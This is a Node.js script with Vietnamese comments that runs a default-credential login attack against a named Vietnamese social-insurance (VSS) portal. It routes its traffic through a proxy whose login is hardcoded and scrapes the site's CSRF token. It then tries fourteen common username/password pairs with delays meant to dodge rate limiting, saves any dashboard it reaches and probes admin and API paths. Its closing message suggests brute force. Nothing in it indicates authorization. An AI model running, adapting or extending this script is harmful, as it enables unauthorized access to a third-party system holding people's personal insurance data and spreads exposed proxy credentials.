const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('🔑 THỬ ĐĂNG NHẬP VSS PORTAL VỚI USERNAME');
console.log('=' * 60);

// Tạo client
function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 15000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Connection': 'keep-alive'
    }
  });
}

// Lấy CSRF token và cookies
async function getLoginTokens() {
  const client = createClient();
  
  try {
    const response = await client.get(`${baseUrl}/login`);
    
    // Extract CSRF token từ HTML
    const tokenMatch = response.data.match(/_token["\s]*value=["']([^"']+)["']/i);
    const csrfToken = tokenMatch ? tokenMatch[1] : null;
    
    // Lưu cookies
    const cookies = response.headers['set-cookie'];
    let cookieHeader = '';
    if (cookies) {
      cookieHeader = cookies.map(c => c.split(';')[0]).join('; ');
      client.defaults.headers.Cookie = cookieHeader;
    }
    
    console.log(`🔑 CSRF Token: ${csrfToken ? csrfToken.substring(0, 20) + '...' : 'Không tìm thấy'}`);
    console.log(`🍪 Cookies: ${cookieHeader ? 'Đã lưu' : 'Không có'}`);
    
    return { client, csrfToken };
    
  } catch (error) {
    console.log(`❌ Lỗi lấy token: ${error.message}`);
    return null;
  }
}

// Thử đăng nhập với username-based credentials
async function attemptLogin(client, csrfToken) {
  console.log('\n🔐 THỬ ĐĂNG NHẬP VỚI USERNAMES');
  console.log('─'.repeat(50));
  
  const credentials = [
    // VSS/BHXH usernames
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'admin123' },
    { username: 'admin', password: 'password' },
    { username: 'administrator', password: 'admin' },
    { username: 'administrator', password: 'admin123' },
    { username: 'user', password: 'user123' },
    { username: 'vss', password: 'vss123' },
    { username: 'bhxh', password: 'bhxh123' },
    
    // Common patterns
    { username: 'demo', password: 'demo' },
    { username: 'test', password: 'test' },
    { username: 'root', password: 'root' },
    { username: 'guest', password: 'guest' },
    
    // Specific to Vietnamese systems
    { username: 'quanli', password: 'quanli123' },
    { username: 'quantri', password: 'quantri123' }
  ];
  
  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    console.log(`\n👤 Thử ${i + 1}: "${cred.username}" / "${cred.password}"`);
    
    try {
      // Tạo form data đúng format
      const formData = new URLSearchParams();
      formData.append('_token', csrfToken);
      formData.append('username', cred.username);
      formData.append('password', cred.password);
      
      const response = await client.post(`${baseUrl}/login`, formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': `${baseUrl}/login`,
          'Origin': baseUrl
        },
        maxRedirects: 5 // Allow redirects
      });
      
      console.log(`   📊 Status: ${response.status}`);
      console.log(`   📏 Response length: ${response.data.length} chars`);
      
      // Phân tích response content
      const content = response.data.toLowerCase();
      
      if (content.includes('dashboard') || content.includes('trang chủ') || 
          content.includes('welcome') || content.includes('xin chào') ||
          content.includes('logout') || content.includes('đăng xuất') ||
          content.includes('profile') || content.includes('hồ sơ')) {
        
        console.log('   🎉 CÓ THỂ ĐĂNG NHẬP THÀNH CÔNG!');
        console.log('   ✅ Phát hiện nội dung dashboard/welcome');
        
        // Lưu response để phân tích
        const filename = `/workspace/docs/vss_dashboard_${cred.username}.html`;
        require('fs').writeFileSync(filename, response.data);
        console.log(`   💾 Đã lưu response vào: ${filename}`);
        
        return { 
          success: true, 
          credentials: cred, 
          dashboardHtml: response.data,
          filename: filename
        };
        
      } else if (content.includes('error') || content.includes('lỗi') || 
                 content.includes('invalid') || content.includes('sai') ||
                 content.includes('wrong') || content.includes('failed')) {
        
        console.log('   ❌ Đăng nhập thất bại (có thông báo lỗi)');
        
      } else if (content.includes('đăng nhập') && response.data.length < 5000) {
        
        console.log('   ❌ Quay lại trang đăng nhập (thất bại)');
        
      } else {
        
        console.log('   ⚠️ Response không rõ ràng - cần kiểm tra thêm');
        
        // Check URL sau khi redirect
        if (response.request && response.request.res && response.request.res.responseUrl) {
          const finalUrl = response.request.res.responseUrl;
          console.log(`   🔗 Final URL: ${finalUrl}`);
          
          if (!finalUrl.includes('login')) {
            console.log('   🎯 Có thể thành công (URL không phải login)');
          }
        }
      }
      
    } catch (error) {
      if (error.response && error.response.status === 302) {
        const location = error.response.headers.location;
        console.log(`   🚀 Redirect to: ${location}`);
        
        if (location && !location.includes('login')) {
          console.log('   🎉 CÓ THỂ ĐĂNG NHẬP THÀNH CÔNG (redirect không phải login)!');
        }
      } else {
        console.log(`   ❌ Lỗi: ${error.message}`);
      }
    }
    
    // Delay để tránh rate limiting  
    await new Promise(resolve => setTimeout(resolve, 1500));
  }
  
  return { success: false };
}

// Test truy cập sau khi có thể đã login
async function testAuthenticatedAccess(client) {
  console.log('\n🔓 TEST TRUY CẬP SAU KHI LOGIN');
  console.log('─'.repeat(50));
  
  const protectedPaths = [
    '/',
    '/home', 
    '/dashboard',
    '/admin',
    '/profile',
    '/users',
    '/api/user',
    '/api/me',
    '/api/profile'
  ];
  
  for (let path of protectedPaths) {
    try {
      console.log(`   Testing: ${path}`);
      const response = await client.get(baseUrl + path);
      
      console.log(`   ✅ ${path} - Status: ${response.status} (${response.data.length} chars)`);
      
      // Check content type và nội dung
      const content = response.data.toLowerCase();
      if (content.includes('json')) {
        console.log(`      📊 JSON response detected`);
      }
      
      if (content.includes('dashboard') || content.includes('admin') || 
          content.includes('user') || content.includes('profile')) {
        console.log(`      🎯 Có nội dung quan trọng!`);
      }
      
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      console.log(`   ❌ ${path} - ${status}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 300));
  }
}

// Main function
async function main() {
  try {
    // Step 1: Lấy token và setup session
    console.log('🔧 SETUP SESSION VÀ CSRF TOKEN');
    const setupResult = await getLoginTokens();
    if (!setupResult) {
      console.log('❌ Không thể setup session');
      return;
    }
    
    const { client, csrfToken } = setupResult;
    
    if (!csrfToken) {
      console.log('❌ Không có CSRF token');
      return;
    }
    
    // Step 2: Thử đăng nhập
    const loginResult = await attemptLogin(client, csrfToken);
    
    if (loginResult.success) {
      console.log('\n🎊 THÀNH CÔNG! ĐĂNG NHẬP ĐƯỢC VSS PORTAL!');
      console.log(`✅ Username: ${loginResult.credentials.username}`);
      console.log(`✅ Password: ${loginResult.credentials.password}`);
      console.log(`💾 Dashboard saved: ${loginResult.filename}`);
      
      // Step 3: Test authenticated access
      await testAuthenticatedAccess(client);
      
    } else {
      console.log('\n😞 Không tìm được credentials đúng');
      console.log('💡 Có thể cần thử với credentials khác hoặc brute force');
    }
    
    console.log('\n📊 HOÀN THÀNH!');
    
  } catch (error) {
    console.error('💥 Lỗi tổng thể:', error.message);
  }
}

main();